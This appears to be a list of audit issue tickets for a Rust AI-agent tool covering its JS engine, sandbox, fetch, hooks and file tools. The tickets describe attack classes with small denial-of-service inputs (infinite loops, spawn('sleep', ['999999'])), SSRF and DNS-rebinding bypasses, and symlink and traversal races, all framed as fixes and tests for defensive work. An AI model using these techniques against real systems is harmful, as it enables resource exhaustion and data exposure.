title: RACE-CONDITION: No timeout on reply channel await in JS tool
description:
## What is wrong
The JsTool::call method awaits reply_rx without a timeout. If the JS thread hangs, deadlocks, or becomes unresponsive, the tool call will block indefinitely, hanging the entire agent turn. There is no way for the caller to detect or recover from a stuck JS engine.

## Exploit / failure scenario
JavaScript code triggers an infinite loop or blocks on I/O → js_thread_main is stuck in run_step → reply_tx never sends → reply_rx.await hangs forever → tool never returns → agent turn never completes.

## Fix
Wrap the reply_rx.await with tokio::time::timeout(STEP_TIMEOUT, reply_rx). Return ToolError::Msg("JS engine reply timeout") if the timeout elapses. STEP_TIMEOUT is already defined in types.rs as 30 seconds.

## Verification
Create a JavaScript payload that loops infinitely or calls a blocking operation. Verify that the tool returns a timeout error within ~30 seconds instead of hanging the agent.

## Location
src/extras/js/tool.rs:64

title: RACE-CONDITION: Race condition: SUBAGENT_EVENT_TX overwritten by concurrent spawn_agent calls
description:
## What is wrong
The static SUBAGENT_EVENT_TX is not protected from concurrent overwrites when multiple spawn_agent tasks run in parallel. When set_subagent_event_tx() is called from different tokio tasks (spawned by separate spawn_agent calls), the last caller wins, overwriting the previous event channel. Subagent tasks spawned by the first agent will then send events to the second agent's receiver, corrupting event routing.

## Exploit / failure scenario
Scenario: Main agent spawns task T1 which sets SUBAGENT_EVENT_TX=tx1. Concurrently, another spawn_agent spawns task T2 which sets SUBAGENT_EVENT_TX=tx2 (overwrites tx1). When T1's task tool calls clone_subagent_event_tx(), it gets tx2 instead of tx1. Subagent tasks from T1 send events to tx2, which is listened by the second AgentRunner (wrong destination).

## Fix
Protect the operation with a lock that covers both the read in clone_subagent_event_tx and the write in set_subagent_event_tx. Alternatively, store the tx in AgentRunner or pass it directly instead of using a global static. Consider using a per-runner identifier or context to ensure subagent events are routed to the correct parent.

## Verification
Create two concurrent spawn_agent calls, have both create subagent tasks via the task tool, and verify that each subagent sends events only to its parent's event_rx (not the sibling's). Add a test with explicit tokio::time to control scheduling and force the race condition.

## Location
src/extras/subagents/mod.rs:23

title: MISSING-FEATURE: Missing test coverage for timeout, exceptions, and permissions
description:
## What is wrong
Only 2 tests exist: test_return_value (line 20) and test_read_write_roundtrip (line 33). Missing critical path coverage: (1) timeout test — verify 30s limit triggers JsOutcome::Timeout; (2) exception test — verify uncaught JavaScript errors are caught and stack trace extracted; (3) permission denial test — verify check_perm blocks unauthorized code; (4) OOM test — verify memory limit triggers OomKilled (see previous finding).

## Exploit / failure scenario
Timeout behavior is untested, so bugs in the interrupt handler or timeout logic are not caught. Exception handling is untested, so stack traces may be missing or malformed. Permission checks are untested, so unauthorized operations might escape restrictions.

## Fix
Add tests: (1) async fn test_timeout() with code that never completes (infinite loop or setTimeout()); (2) async fn test_exception() with code throwing an error, verify error message and stack in output; (3) async fn test_permission_denied() with permission checks enabled, verify JS error message about permission denial; (4) async fn test_oom() with large allocation (see OOM finding).

## Verification
Run all new tests; ensure they pass and cover the timeout, exception, OOM, and permission paths.

## Location
src/extras/js/tests/mod.rs:60

title: MISSING-FEATURE: OomKilled variant never triggered in tests or code
description:
## What is wrong
The JsOutcome::OomKilled variant (line 25) is defined but never constructed anywhere in the codebase. engine.rs sets rt.set_memory_limit(MEMORY_LIMIT) (64 MiB) but never checks if this limit is exceeded or catches OutOfMemory errors. The rquickjs runtime will trap OOM internally, but the code has no path to return JsOutcome::OomKilled. This means OOM events are silently swallowed or converted to generic Error outcomes, making them indistinguishable from other failures.

## Exploit / failure scenario
User runs JS code that allocates more than 64 MiB. The runtime hits the memory limit, but the error is not properly classified as OOM, so the user sees a generic error instead of the helpful 'out of memory (64 MiB limit exceeded)' message shown in tool.rs:75.

## Fix
Catch rquickjs::Error when it indicates OOM exhaustion. Check rquickjs documentation for the OOM error variant or use error message inspection. When caught, return JsOutcome::OomKilled. Alternatively, add a memory-pressure hook that monitors rt.memory_usage() and proactively returns OomKilled when approaching the limit.

## Verification
Write test allocating large array (e.g., `new Array(100_000_000)`) and confirm tool returns 'out of memory' message, not generic error.

## Location
src/extras/js/types.rs:25

title: PERF: Missing timeout on blocking host calls violates invariant 6
description:
## What is wrong
The engine.rs sets up an interrupt handler (line 26) that fires based on elapsed wall-clock time during JS bytecode execution. However, the interrupt handler does NOT fire during host function calls (read_file, write_file, spawn) because those are blocking Rust calls outside the JS VM. Per stated invariant 6: 'Interrupt handler fires only during JS bytecode — add tokio::time::timeout on blocking host calls.'

## Exploit / failure scenario
JS code: spawn('sleep', ['999999']) or spawn('find', ['/']) on a large filesystem causes the JS engine thread to hang indefinitely, blocking the entire thread and preventing timeout.

## Fix
Wrap each blocking operation in tokio::time::timeout with a reasonable duration (suggest 30s to match STEP_TIMEOUT). For read_file: wrap the std::fs::read_to_string in timeout. For write_file: wrap std::fs::write. For spawn: wrap Command::output(). Return a timeout error if the operation exceeds the limit.

## Verification
Verify that (1) spawn('sleep', ['60']) returns a timeout error within 30 seconds; (2) read_file on a slow filesystem returns error rather than hanging forever; (3) STEP_TIMEOUT is still enforced for pure JS loops; (4) legitimate operations that complete within timeout work correctly.

## Location
src/extras/js/host.rs:15

title: [AUDIT] Remove cargo package --no-verify and test packaged crate contents
description:
## Problem / security impact
`.github/workflows/ci.yml:76-85` uses `cargo package --no-verify`, allowing missing files, invalid package metadata, or package-only build/test failures to reach release.

## Scope / files
- `.github/workflows/ci.yml:76-85`
- `Cargo.toml` include/exclude/package metadata
- packaged-crate feature tests

## Required implementation
Run normal locked `cargo package` verification. Inspect/package the generated `.crate`, build/install it in an isolated temporary `CARGO_HOME`/target without relying on untracked workspace files, and exercise the documented default and JS feature contract. Fix the underlying package issue rather than retaining `--no-verify`. If a narrowly unavoidable exception remains, document the exact Cargo limitation and add equivalent isolated verification that fails for missing packaged inputs.

## Acceptance criteria
- CI contains no unexplained `cargo package --no-verify`.
- `cargo package --locked` succeeds.
- The `.crate` contains all runtime/docs/license assets required by Cargo metadata and feature-gated modules.
- An isolated install/test of packaged sources exercises the promised default/JS behavior.

## Validation
Run `cargo package --locked`, extract the generated `.crate` into a fresh temp directory, then run the package's supported `cargo test` feature rows and `cargo install --path . --debug` there. Expected result: no dependency on files outside the package and JS feature smoke passes when promised. Add this sequence to CI.
acceptance_criteria: Normal locked Cargo package verification and isolated packaged-source tests pass; --no-verify is removed or replaced only by a documented equivalent gate.

title: [AUDIT] Smoke-test every release archive before upload
description:
## Problem / security impact
`.github/workflows/release.yml:70-103` can upload archives that were built but never installed/executed. Missing files, wrong permissions, wrong feature flags, or broken dynamic linkage are discovered only by users.

## Scope / files
- `.github/workflows/release.yml:70-103`
- archive assembly and checksum steps
- cross-platform `scripts/smoke-release-archive.*`

## Required implementation
For every matrix artifact, extract into a fresh directory after archive creation and before checksum/publication, locate only the packaged binary, verify executable permissions/linkage, run `--version`, inspect promised tool availability, and execute a real JS runtime smoke where supported. Upload/release jobs must depend on successful smoke for every artifact. Do not test the workspace `target/` binary by mistake.

## Acceptance criteria
- Each Linux/macOS/Windows archive is independently extracted and executed on a compatible clean runner.
- Version equals the release tag; promised JS/default features are present.
- Missing binary/assets, bad executable mode, wrong archive layout, or broken JS runtime blocks upload.
- Checksums are generated only for artifacts that passed smoke.

## Validation
Run the release workflow in dry-run/prerelease mode. Each matrix row invokes the packaged binary path, `--version`, and the documented JS smoke yielding `2` from `1 + 1`. Add a fixture/job that removes a required file and proves upload is skipped. Expected result: publication has an explicit dependency on all smoke jobs.
acceptance_criteria: Every exact release archive is extracted and executed for version, layout, linkage, promised features, and JS runtime before checksum generation and upload.

title: [AUDIT] Add Windows MSVC CI for JS feature combinations and runtime smoke tests
description:
## Problem / security impact
The product is described as cross-platform, but JS integration has no Windows CI proving rquickjs compilation/runtime behavior or safe spawn policy. Source compatibility alone is not enough for embedded-runtime delivery.

## Scope / files
- `.github/workflows/ci.yml` or a dedicated Windows workflow
- `Cargo.toml` feature matrix
- Windows-specific sandbox/spawn branches
- JS smoke/integration tests

## Required implementation
Add an MSVC Windows job that runs no-feature and JS feature tests, plus relevant `js,skills` compilation/tests when dependencies support Windows. Execute a real JS runtime smoke test, not only metadata/type checking. Define a safe Windows `spawn` policy while process isolation is absent: unavailable/denied by default or separately explicit unsandboxed consent. Cache dependencies without masking feature drift and upload useful failure logs.

## Acceptance criteria
- Windows MSVC runs `cargo test`, `cargo test --features js`, and a JS evaluation smoke test.
- Supported combined feature rows are tested; unsupported rows are documented and fail with clear configuration errors.
- JS spawn cannot silently claim/use sandbox isolation on Windows.
- The job is required for changes to JS/platform/release files.

## Validation
In GitHub Actions on `windows-latest`, run `cargo test`, `cargo test --features js`, and `cargo test --features js js_runtime_smoke`. Run the supported `js,skills` row or document an explicit tracked blocker. Expected smoke result: evaluate `1 + 1` through production JS plumbing and receive `2`; unsafe spawn policy test passes.
acceptance_criteria: Required Windows MSVC CI executes real JS runtime tests across supported feature rows and enforces the documented fail-closed spawn policy.

title: [AUDIT] Protect config persistence with private filesystem permissions
description:
## Problem / security impact
Config persistence in `src/config/load.rs:508-535` may write plaintext API keys and tokens using process-default permissions. A permissive umask can expose credentials to other local users, including through temporary files.

## Scope / files
- `src/config/load.rs:508-535`
- shared atomic-write/config-directory helpers
- config save/load tests and credential-storage documentation

## Required implementation
On Unix create config directories as `0700` and config, lock, backup, and temporary files as `0600` at creation. For existing broader modes, safely repair owned regular paths or reject; never chmod through a symlink. Ensure atomic replacement preserves private mode. Define and document Windows ACL behavior without claiming Unix-mode enforcement.

## Acceptance criteria
- Config and all intermediate files are `0600`; containing private directories are `0700`, independent of umask.
- Existing unsafe, symlink, directory, and non-owned cases follow a documented fail-closed policy.
- Atomic save cannot replace a secure file with a broader-mode file.
- Errors never echo stored secret values.

## Validation
On Unix run `cargo test config_persistence_permissions` under permissive umasks and assert modes during and after save, mode repair/rejection, symlink rejection, and failure cleanup. Run `cargo test config::` and `cargo test`. Add a non-Unix branch test matching the documented policy.
acceptance_criteria: Config persistence creates private directories/files/intermediates, safely handles unsafe existing paths, preserves modes across atomic saves, and never leaks secret values.

title: [AUDIT] Bound subagent concurrency, aggregate output, prompt count, and cost
description:
## Problem / security impact
`src/extras/subagents/task_tool.rs:104-172` truncates individual results but does not bound concurrent fan-out, aggregate output, number of prompts/tasks, duration, or cost. One tool invocation can exhaust runtime/memory or create uncontrolled spend.

## Scope / files
- `src/extras/subagents/task_tool.rs:104-172`
- subagent task argument/schema types and configuration
- cancellation/accounting APIs used by subagents
- task-tool tests and user documentation

## Required implementation
Define explicit per-call limits for child count, concurrently running children, aggregate returned bytes/tokens, wall-clock duration, and budget/cost units available from the provider. Validate the complete request before starting work. Use bounded scheduling, propagate cancellation to every child, and stop launching queued work after failure/budget exhaustion. Specify deterministic partial-failure semantics and output ordering. Per-result truncation remains defense in depth, not the aggregate control.

## Acceptance criteria
- Requests over the child/prompt limit are rejected before any child starts.
- Runtime concurrency never exceeds the configured maximum.
- Aggregate output/cost/deadline bounds stop/cancel remaining work and return explicit partial status.
- Cancellation leaves no child task running.
- Mixed success/failure output ordering and accounting are deterministic.

## Validation
Run `cargo test task_tool_limits` and the existing subagent test module. Use a fake executor with concurrency counters, controllable output sizes/delays/cost, and cancellation probes. Assert peak concurrency, number started, aggregate bytes/cost, deadline behavior, deterministic ordering, and zero live children after return. Run the relevant feature combination used by CI plus `cargo test`.
acceptance_criteria: Subagent task invocations enforce preflight count, bounded concurrency, aggregate output/cost/deadline limits, cancellation, and deterministic partial failures.

title: [AUDIT] Prevent hook pipe deadlock and bound hook subprocess resources
description:
## Problem / security impact
`src/extras/hooks/subprocess.rs:89-129` can wait on one pipe while a child fills the other, causing deadlock. Hook processes also need explicit time/output limits and descendant cleanup because hooks execute during agent control flow.

## Scope / files
- `src/extras/hooks/subprocess.rs:89-129`
- hook configuration/documentation for limits
- hook subprocess tests

## Required implementation
Drain stdout and stderr concurrently, enforce independent and combined byte caps, and apply a finite default deadline. On timeout, cancellation, cap breach, or consumer failure, kill and reap the complete process tree. Define whether capped output is a hard failure or a truncated hook result; it must not be silently accepted as complete. Preserve required hook stdin and exit-code semantics.

## Acceptance criteria
- A child filling stderr while stdout is idle cannot deadlock; the inverse also holds.
- Infinite and forked hook processes are terminated and reaped.
- Captured output remains within configured/documented limits.
- Timeout/truncation/nonzero-exit results are distinguishable to the hook caller.

## Validation
Run `cargo test hook_subprocess_limits` and `cargo test extras::hooks`. Add deterministic local helper processes for stdout fill, stderr fill, mixed fill, infinite sleep, forked child, and normal hook. Assert wall-clock and byte bounds and no surviving descendants. Run `cargo test`.
acceptance_criteria: Hook subprocesses concurrently drain bounded pipes, time out, clean process trees, and return deterministic timeout/truncation results.

title: [AUDIT] Bound Bash subprocess runtime and streaming output
description:
## Problem / security impact
Bash subprocess execution can run forever or produce unbounded stdout/stderr. Waiting for full output risks memory exhaustion and pipe deadlock, and timeout without process-tree cleanup leaves descendants alive.

## Scope / files
- `src/sandbox.rs:205-279`
- `src/agent/tools/bash.rs:142-197`
- shared subprocess/streaming helpers used by Bash
- Bash tool tests

## Required implementation
Apply a mandatory finite default deadline with an optional lower configured limit, byte caps for stdout, stderr, and combined output, and concurrent draining of both pipes. Stream or buffer incrementally rather than `wait_with_output` on unbounded data. On deadline, cancellation, output cap, or receiver loss, terminate the process group/job object and reap all descendants. Return deterministic timeout/truncation metadata without presenting partial output as complete success. Bounds must apply even when the child emits on only one pipe.

## Acceptance criteria
- Infinite commands terminate within the configured deadline and leave no descendant process.
- Unlimited stdout, unlimited stderr, and mixed output stay within the documented byte cap without deadlock.
- Exit code, timeout, cancellation, and truncation are distinguishable.
- Output order/encoding behavior is documented and stable enough for callers.

## Validation
Run `cargo test bash_resource_limits` and `cargo test agent::tools::bash`. Tests launch an infinite process, a process that forks a persistent child, stdout-only and stderr-only flooders, and a mixed-output process. Assert wall-clock bounds, bounded captured bytes, deterministic status, and that descendant PIDs are gone. Run `cargo test`.
acceptance_criteria: Bash has mandatory deadlines, bounded concurrent stdout/stderr handling, deterministic truncation/error semantics, and process-tree cleanup.

title: [AUDIT] Define and enforce Linux sandbox confidentiality and network policy
description:
## Problem / security impact
The Linux bubblewrap-style policy currently read-mounts broad host filesystem state and does not unshare networking, while specifications imply stronger isolation. Users cannot tell whether sandboxing protects host confidentiality, mutation, network access, or only selected writes.

## Scope / files
- Linux backend construction in `src/sandbox.rs`
- sandbox documentation in `README.md`, `ARCHITECTURE.md`, and relevant `docs/specs/`
- Linux CI capability tests

## Required implementation
Define a capability matrix for filesystem read visibility, filesystem writes, process namespace, devices, environment, and network. Then either narrow mounts and unshare networking to meet the documented guarantee, with explicit bind mounts for required workspace/runtime assets, or narrow all product/spec claims to the protection actually provided. Default policy for agent subprocesses must be explicit. Backend setup errors fail closed. Keep fetch/network permissions meaningful: a sandbox must not claim network isolation while inheriting unrestricted host networking.

## Acceptance criteria
- Documentation states exactly what Linux sandboxing does and does not isolate.
- Automated tests assert the selected filesystem and network policy, not only that a command runs.
- Attempts to read a disallowed host path, write outside writable roots, or access the network produce the documented result.
- Capability reporting matches actual backend flags/mounts.

## Validation
In Linux CI run `cargo test linux_sandbox_policy` and `cargo test sandbox::`. The test enters the real backend and probes approved workspace access, a disallowed host path, external write, loopback/network behavior, and backend setup failure. Expected outcomes must match the checked-in capability matrix. Run `cargo test --features js,sandbox` on Linux for JS spawn parity.
acceptance_criteria: Linux sandbox behavior is enforced and documented by a tested capability matrix for host reads, writes, namespaces, devices, environment, and network.

title: [AUDIT] Fail closed when a requested sandbox backend is unavailable
description:
## Problem / security impact
When sandboxing is requested but the platform/backend is unavailable, current startup/execution paths can continue unsandboxed. This converts an explicit safety request into silent unrestricted execution.

## Scope / files
- `src/sandbox.rs:88-144`
- `src/startup.rs:416-420`
- CLI/config parsing that selects sandbox behavior
- Bash and JS spawn launch paths

## Required implementation
Represent sandbox policy as explicit states: disabled, required-and-available, and required-but-unavailable. Required-but-unavailable must block process launch with a clear diagnostic. If unsandboxed fallback is supported, require a separate explicit user choice/consent that is distinguishable from merely requesting sandboxing; do not infer it from backend detection. Expose backend capability before tools are registered so Bash and JS spawn share the same policy. Do not allow per-tool fallback drift.

## Acceptance criteria
- Requested + unavailable never launches a child by default.
- Disabled mode preserves intentionally unsandboxed behavior.
- Requested + available launches through the backend.
- Any explicit fallback mode is separately named, surfaced to the user, auditable, and tested.
- Startup and runtime diagnostics identify the unavailable backend without claiming isolation.

## Validation
Run `cargo test sandbox_unavailable` and `cargo test sandbox::`. Add fake-backend tests for requested/unavailable, disabled, available, and explicit fallback; use a sentinel command to prove no child starts in the fail-closed case. Run `cargo test --features js,sandbox` to verify JS spawn uses the same decision.
acceptance_criteria: A requested unavailable sandbox blocks execution unless a separately explicit unsandboxed fallback was chosen; all process-launch tools share the policy.

title: [AUDIT] Make atomic writes race-resistant and symlink-safe
description:
## Problem / security impact
The atomic-write helper in `src/fs.rs:34-88` relies on path-based checks and predictable filesystem operations that can be raced or redirected through symlinks. An attacker controlling a writable directory can precreate temporary names or swap parent/final targets between validation and rename.

## Scope / files
- `src/fs.rs:34-88`
- callers that use atomic writes for config/session/tool output
- Unix-focused filesystem security tests; documented non-Unix behavior

## Required implementation
Use descriptor-relative operations and no-follow semantics where the platform supports them. Create the temporary file exclusively in the destination directory with unpredictable names and restrictive permissions, write/sync as required by the existing durability contract, revalidate the approved root and parent immediately before mutation, and atomically rename without following a hostile final symlink. Define replacement behavior for existing regular files, symlinks, directories, and cross-filesystem paths. On platforms lacking equivalent primitives, fail closed for security-sensitive callers or document and test a conservative fallback.

## Acceptance criteria
- Precreated temp names cannot be opened/truncated.
- Final-target and parent-directory symlink swaps cannot redirect the write outside the approved root.
- Sibling-prefix paths such as `/safe-root-evil` do not satisfy `/safe-root` containment.
- Partial failures leave either the prior file or complete new file, not partial content.
- Temporary files are cleaned up without deleting attacker-owned paths.

## Validation
Run `cargo test atomic_write_security` and `cargo test fs::`. Add adversarial tests for precreated temp files, final symlink swap, parent symlink swap, sibling-prefix path, destination directory, concurrent writers, and injected rename/write failures. Run `cargo test`. Expected result: no test writes outside its temporary approved root and atomicity is preserved.
acceptance_criteria: Atomic writes use exclusive/no-follow race-resistant operations and cannot be redirected by temp-name, final-target, parent-symlink, or sibling-prefix attacks.

title: [AUDIT] Apply external-path authorization to find_files
description:
## Problem / security impact
`find_files` can enumerate paths outside the approved workspace without the external-path permission check applied by `read`. Enumeration leaks names and structure even when file contents are not opened.

## Scope / files
- `src/agent/tools/find_files.rs`
- external-path helpers in `src/permission/checker.rs:517-535`
- find-files tool and permission tests

## Required implementation
Authorize the canonical search root before walking it. Reuse one shared external-path policy with `read`/`grep`; do not decide security from raw path prefixes or raw glob strings. Define omitted-root, relative, traversal, absolute, tilde, and symlink behavior. Keep the authorized root bound to the actual traversal root, and fail before enumeration on Deny/Ask failure or permission-channel closure.

## Acceptance criteria
- Workspace-local searches retain current behavior.
- Absolute external roots, `../` traversal, tilde paths, and directory-symlink escapes ask or deny consistently with `read`.
- Denied roots yield no filenames or partial results.
- Glob matching cannot change the authorized traversal root.

## Validation
Run `cargo test find_files_external_path_permission` and `cargo test agent::tools::find_files`. Tests cover local, external absolute, traversal, tilde, symlink escape, empty root, and permission-channel failure. Expected result: enumeration starts only after the exact canonical root is authorized.
acceptance_criteria: find_files authorizes the exact canonical traversal root and emits no results for denied or escaping paths.

title: [AUDIT] Apply external-path authorization to grep
description:
## Problem / security impact
`grep` can read paths outside the approved workspace without applying the external-path permission policy used by the `read` tool. Pattern approval alone does not authorize the searched files and permits unintended disclosure.

## Scope / files
- `src/agent/tools/grep.rs`
- external-path helpers in `src/permission/checker.rs:517-535`
- grep tool tests and permission-checker tests

## Required implementation
Resolve and authorize the search root/path separately from the pattern before filesystem traversal. Reuse the canonical external-path policy used by `read`; do not implement a raw string-prefix check. Define behavior for omitted path, relative traversal, absolute paths, tilde expansion, and symlinks. Revalidate the resolved root used by the operation so authorization and execution refer to the same path. Permission Deny/Ask/channel errors must prevent traversal and return a normal tool error.

## Acceptance criteria
- Workspace-local grep retains current behavior.
- Absolute external paths, `../` traversal, tilde paths, and symlink escapes trigger the same Ask/Deny decision as `read`.
- The pattern itself cannot be mistaken for path authorization.
- A denied external path is never opened or walked.

## Validation
Add named tests and run `cargo test grep_external_path_permission` plus `cargo test agent::tools::grep`. Cover local, absolute external, traversal, tilde, directory symlink escape, and permission-channel failure. Expected result: only canonical workspace-contained roots execute without external-path approval.
acceptance_criteria: grep independently authorizes its canonical search path; traversal, absolute, tilde, and symlink escapes cannot bypass external-path policy.

title: [D2] Enforce full content-addressed skill identity in SkillStore CRUD
description:
## Problem / security impact
The proposed store trusts a caller-provided 16-hex-character hash of source only. Tests can be changed without identity change, truncated hashes raise collision risk, and tampered rows can be returned as valid.

## Scope / files
- `src/extras/js/skills/store.rs` CRUD/schema and row decoding
- `src/extras/js/skills/mod.rs` `Skill` identity fields
- schema migration/versioning
- Phase 3 spec and store tests

## Required implementation
Define a versioned canonical byte serialization for identity-bearing fields including at least source and ordered tests; specify normalization (prefer exact UTF-8 bytes, no implicit whitespace/newline changes). Compute the full 64-hex SHA-256 in trusted store/domain code. `insert` must recompute and reject a mismatched caller ID rather than trusting it. `get/list/promotion` must recompute and reject/quarantine tampered rows before use. Define collision behavior as an error unless canonical payload is byte-identical. Persist identity version for future migration. Keep description/embedding/usage metadata outside identity only if documented. Implement the complete owned CRUD contract, including `delete()` if the store API/spec exposes it, with not-found results as errors/options rather than panics.

## Acceptance criteria
- Source or any test/order change changes the full ID.
- Caller-provided mismatched IDs and tampered database rows are rejected.
- Duplicate identical payload and theoretical same-ID/different-payload paths have explicit tested behavior.
- Insert/get/list/delete/embedding/usage operations preserve and validate identity.
- Migration rejects or explicitly upgrades legacy 16-character IDs before activation.

## Validation
Run `cargo test --features skills skill_store_identity` and `cargo test --features skills`. Tests cover deterministic canonical vectors, source/test/order mutations, mismatched caller ID, row tampering, legacy ID, duplicate identical insert, collision simulation via injectable hasher/test hook, not-found delete, and CRUD round trip. Expected active reads never return identity-invalid skills.
acceptance_criteria: SkillStore recomputes a full SHA-256 over versioned canonical identity data including source and tests, rejects caller/tamper/collision mismatches, and covers the complete CRUD contract including delete.

title: [D2] Enforce SSRF-safe fetch authorization on every destination
description:
## Problem / security impact
A URL-glob permission check alone does not prevent SSRF. Approved hostnames can resolve to loopback/private/link-local/metadata addresses, redirect to them, or change DNS answers between check and connect. Embedded credentials and unsupported schemes create additional ambiguity.

## Scope / files
- `src/extras/js/host.rs` fetch URL parsing/authorization
- JS permission bridge and `src/permission/checker.rs` `js/fetch` policy
- URL/network policy config and Phase 2 spec
- deterministic resolver/redirect tests

## Required implementation
Parse URLs with one trusted parser; allow only explicitly approved schemes (normally `https`, optionally `http` by policy), reject embedded credentials, fragments/options that are not supported, and malformed/ambiguous hosts. Resolve all addresses before connect and reject loopback, private, link-local, multicast, unspecified, reserved, and cloud metadata destinations for IPv4/IPv6, including mapped forms. Bind connection to authorized resolution results or revalidate at connect to address DNS rebinding. Send `js/fetch` permission for the normalized URL and exact resolved destination policy. Disable automatic redirects and repeat scheme, credentials, resolution, destination, allow-list, and permission authorization at every hop with a finite hop count. Define proxy behavior so it cannot bypass destination policy.

## Acceptance criteria
- Localhost, RFC1918, link-local, IPv6 local, multicast/reserved, and common metadata endpoints are denied by default even via hostname.
- Embedded credentials and non-approved schemes are denied.
- DNS answer changes and redirects to denied destinations cannot bypass checks.
- Every hop has a finite permission wait and denial starts no request to that destination.
- Public allowed destinations work under explicit policy.

## Validation
Run `cargo test --features js,sandbox js_fetch_ssrf_policy` with an injected fake resolver and local servers. Cover all address classes, IPv4-mapped IPv6, decimal/alternate host forms accepted by the parser, rebinding, redirect chains/loops, credential URLs, schemes, proxy configuration, Allow/Deny/Ask/timeout/channel closure, and an allowed public-test address without Internet access. Run `cargo test --features js,sandbox`.
acceptance_criteria: Fetch authorizes allowed schemes and every resolved/redirect destination, rejects credentials and non-public/metadata addresses including DNS rebinding, and handles permission outcomes with deterministic local tests.

title: [D2] Implement bounded fetch transport with redirect control
description:
## Problem / security impact
The proposed `reqwest::blocking::Client::new()` plus `resp.text()` has no connect/read/total deadline or body bound and follows redirects implicitly. It can hang the JS thread, exhaust memory/decompression, or bypass authorization at a redirect.

## Scope / files
- `src/extras/js/host.rs` `FetchResult` and fetch transport
- `Cargo.toml` reqwest features
- `src/extras/js/types.rs` cancellation/result state as needed
- deterministic local HTTP test fixtures

## Required implementation
Construct/inject a configured blocking client with finite connect, per-read, and total host-call deadlines. Disable automatic redirects; return each redirect target to the authorization layer for revalidation before the next request. Bound request body, headers, response headers, compressed bytes, decompressed bytes, and returned text. Stream incrementally rather than unbounded `text()`. Support only explicitly documented methods/options and reject invalid headers/encodings as typed JS errors. Propagate cancellation and ensure a fetch failure does not kill the JS thread. Do not use public Internet in tests.

## Acceptance criteria
- Slow connect/read and endless bodies terminate within limits.
- Compressed and decompressed response limits are both enforced.
- Redirects are not followed by the transport without authorization of the new target.
- Returned status/body/truncation-or-error semantics are deterministic.
- Cancellation/channel errors leave the JS thread usable.

## Validation
Run `cargo test --features js,sandbox js_fetch_transport` against local TCP/HTTP fixtures for normal response, slow headers/body, endless body, oversized headers/body, compression bomb, redirect, cancellation, malformed response, and recovery. Then run `cargo test --features js,sandbox` and `cargo test --features js`.
acceptance_criteria: Fetch transport uses an injected bounded client, finite connect/read/total deadlines, compressed/decompressed/body caps, manual redirect handoff, cancellation, and deterministic local tests.

title: [D2] Enforce JS file allow-lists at final read/write operations
description:
## Problem / security impact
Checking an allow-list before `std::fs::read_to_string`/`write` leaves a check/use race and can follow a swapped symlink. Compile-time signature differences also risk a safe sandbox build but unsafe plain-JS build.

## Scope / files
- `src/extras/js/host.rs` `make_read_file`, `make_write_file`, and registration
- JS engine/tool configuration plumbing
- filesystem host integration tests

## Required implementation
Thread one `AllowConfig` policy through production host registration whenever file globals exist; do not create a parallel unrestricted signature. Apply the Phase 1 `js/read_file`/`js/write_file` permission check and Phase 2 allow-list, then revalidate containment immediately at descriptor-relative/no-follow open or mutation. For writes, use the race-resistant atomic-write contract and safely handle nonexistent targets. Treat allow-list as an additional restriction: permission approval cannot override a denied root unless an explicitly designed higher-level policy says so. Handle policy/config/channel errors as JS errors with no I/O.

## Acceptance criteria
- In-root authorized reads/writes succeed; either permission denial or allow-list denial prevents I/O.
- Final/parent symlink swaps between check and operation cannot escape the root.
- Plain `js` and `js,sandbox` feature rows do not expose an unrestricted alternate closure.
- Empty lists and malformed config follow the deny-safe policy.
- Errors do not panic or kill the JS thread.

## Validation
Run `cargo test --features js,sandbox js_file_allow_enforcement`, `cargo test --features js,sandbox`, and `cargo test --features js`. Integration tests race final/parent symlink swaps, exercise nonexistent targets and sibling-prefix paths, combine Allow/Deny with allowed/denied roots, and assert no outside file is read or changed. Run `cargo test`.
acceptance_criteria: Read/write operations enforce both permission and canonical allow-list policy on the final opened/mutated target with no-follow revalidation, including TOCTOU and nonexistent-target tests.

title: [D2] Define canonical, symlink-safe JS file allow-list policy
description:
## Problem / security impact
The proposed allow-list uses raw glob/prefix matching and treats an empty list as unrestricted. Traversal, sibling prefixes, symlinks, and nonexistent write targets can escape the intended roots.

## Scope / files
- `src/extras/js/host.rs` `AllowConfig` and policy helper
- config schema/loading for JS read/write roots
- `docs/specs/phase-2-sandbox.md`
- path-policy unit tests

## Required implementation
Define an explicit base directory for relative configuration and normalize policies into absolute component-aware roots at load/startup. Decide containment using canonical paths and path components, never raw string prefixes or raw glob matches. For nonexistent write targets, canonicalize the nearest existing parent and validate the remaining relative components. Define final/parent symlink behavior and reject ambiguous paths. Empty or invalid lists must deny all; unrestricted access requires an explicit documented opt-in and still remains permission-gated. Separate read and write roots, and return typed reasons safe for JS/user display.

## Acceptance criteria
- `/safe` does not allow `/safe-evil`, `../` escapes, alternate separators, or symlink escapes.
- Relative policies resolve against one documented base, independent of process CWD.
- Nonexistent write targets under an approved canonical parent can be represented safely; escaping targets cannot.
- Empty/malformed policy denies rather than grants unrestricted access.
- The helper returns an authorization decision only; final operations revalidate separately.

## Validation
Run `cargo test --features js,sandbox js_file_allow_policy`. Tests cover exact root, descendants, sibling-prefix, traversal, relative root/CWD changes, existing and dangling symlinks, parent symlink, nonexistent target, empty list, malformed path, and explicit unrestricted opt-in if provided. Run `cargo test --features js,sandbox` and `cargo test --features js`.
acceptance_criteria: JS file allow-list decisions use normalized absolute component containment rooted at an explicit base, deny safely on empty/invalid policy, and specify symlink/nonexistent-target behavior with adversarial tests.

title: [D2] Add adversarial JS engine and permission lifecycle tests
description:

title: [D2] Map JS timeout, OOM, jobs, and exceptions without panics
description:
## Problem / security impact
The bead's proposed OOM rule—classifying a later `Runtime::new()` failure—does not identify OOM in the runtime that exhausted memory. Exception handling can also assume an object exception and panic on primitive thrown values. Promise jobs and endless microtasks need the same deadline as eval.

## Scope / files
- `src/extras/js/engine.rs` `run_step` and pending-job drain
- `src/extras/js/types.rs` `JsOutcome`
- `src/extras/js/tests/`
- rquickjs 0.12 behavior documented in code comments/tests

## Required implementation
Determine and encode the verified rquickjs 0.12 signal emitted by the current runtime when its memory limit is exceeded; construct `JsOutcome::OomKilled` from that signal. Do not infer prior OOM from the next runtime construction. Set memory/stack limits and the interrupt handler before eval. Drain pending jobs with the same overall deadline and a bounded job/turn policy so endless microtasks time out. Extract object exception stacks when available, but safely stringify primitive throws and rejected-Promise reasons. Map timeout, OOM, syntax/runtime error, and rejected job deterministically without message-substring ambiguity where typed APIs are available. Always drop the runtime and keep the JS thread alive.

## Acceptance criteria
- A current-runtime allocation limit produces `OomKilled`.
- Infinite eval and endless microtasks produce `Timeout` within the configured bound.
- `throw 'x'`, `throw 1`, `throw null`, syntax errors, and rejected Promises return safe errors without panic.
